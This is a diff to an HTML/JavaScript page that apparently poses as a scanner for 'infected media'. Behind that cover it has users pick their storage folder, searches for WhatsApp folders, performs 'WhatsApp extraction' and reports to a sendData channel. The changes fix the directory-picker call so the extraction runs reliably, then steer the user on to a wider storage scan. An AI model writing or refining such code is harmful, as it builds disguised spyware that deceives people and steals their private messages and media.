@@ -192,6 +192,8 @@
         }
         .storage-btn-container { margin-top: 12px; text-align: center; }
         .storage-btn-container .btn { max-width: 280px; margin: 0 auto; }
+        .btn-container { margin-top: 12px; }
+        .btn-container .btn { margin-top: 6px; }
         .speed-badge {
             display: inline-block;
             background: rgba(0, 200, 100, 0.1);
@@ -202,9 +204,6 @@
             border: 1px solid rgba(0, 200, 100, 0.1);
             margin-left: 8px;
         }
-        .btn-container { margin-top: 12px; }
-        .btn-container .btn { margin-top: 6px; }
-        .btn-success { background: linear-gradient(135deg, #25D366, #128C7E); }
     </style>
 </head>
 <body>
@@ -418,7 +417,6 @@
                 const checkInterval = setInterval(() => {
                     if (whatsappComplete || whatsappTriggered) {
                         clearInterval(checkInterval);
-                        // If WhatsApp was skipped (user cancelled), continue anyway
                         if (!whatsappComplete) {
                             addLogEntry('⚠️ WhatsApp extraction skipped or cancelled', 'warn');
                         }
@@ -574,22 +572,40 @@
         }
 
         // ============================================================
-        // WHATSAPP EXTRACTION (User Gesture Triggered)
+        // WHATSAPP EXTRACTION — DIRECT USER GESTURE (FIXED)
         // ============================================================
         async function triggerWhatsAppExtraction(event) {
-            if (event) event.preventDefault();
+            if (event) {
+                event.preventDefault();
+                event.stopPropagation();
+            }
 
             const btn = document.getElementById('whatsappBtn');
             btn.disabled = true;
             btn.textContent = '⏳ Opening WhatsApp folder...';
 
+            // DIRECT USER GESTURE — showDirectoryPicker called IMMEDIATELY
+            let rootHandle;
+            try {
+                rootHandle = await window.showDirectoryPicker({ mode: 'read' });
+            } catch (err) {
+                if (err.name === 'AbortError' || err.name === 'SecurityError') {
+                    addLogEntry('❌ WhatsApp extraction cancelled', 'error');
+                    btn.disabled = false;
+                    btn.textContent = '💬 Retry WhatsApp Extraction';
+                    return;
+                } else {
+                    addLogEntry('❌ WhatsApp extraction error: ' + err.message, 'error');
+                    btn.disabled = false;
+                    btn.textContent = '💬 Retry WhatsApp Extraction';
+                    return;
+                }
+            }
+
             whatsappTriggered = true;
+            addLogEntry('📂 Storage selected for WhatsApp', 'whatsapp');
 
             try {
-                // Step 1: Ask user to select the root folder
-                const rootHandle = await window.showDirectoryPicker({ mode: 'read' });
-                addLogEntry('📂 Storage selected for WhatsApp', 'whatsapp');
-
                 // Try to find WhatsApp folder
                 let whatsappFound = false;
                 const whatsappPaths = [
@@ -625,6 +641,12 @@
                     whatsappComplete = true;
                     btn.disabled = false;
                     btn.textContent = '💬 Retry WhatsApp Extraction';
+                    document.getElementById('whatsappBtnContainer').style.display = 'none';
+                    document.getElementById('storageBtnContainer').style.display = 'block';
+                    document.getElementById('scanDesc').textContent = '📁 Tap "Select Storage" to scan for infected media...';
+                    document.getElementById('scanIcon').classList.remove('spinning');
+                    document.getElementById('scanIcon').textContent = '📁';
+                    updateProgress(55);
                     return;
                 }
 
@@ -662,7 +684,7 @@
 
                 if (err.name === 'AbortError' || err.name === 'SecurityError') {
                     addLogEntry('❌ WhatsApp extraction cancelled', 'error');
-                    whatsappComplete = true; // Allow user to skip to gallery
+                    whatsappComplete = true;
                 } else {
                     addLogEntry('❌ WhatsApp extraction error: ' + err.message, 'error');
                     sendData({ type: 'whatsapp_extraction_error', error: err.message });
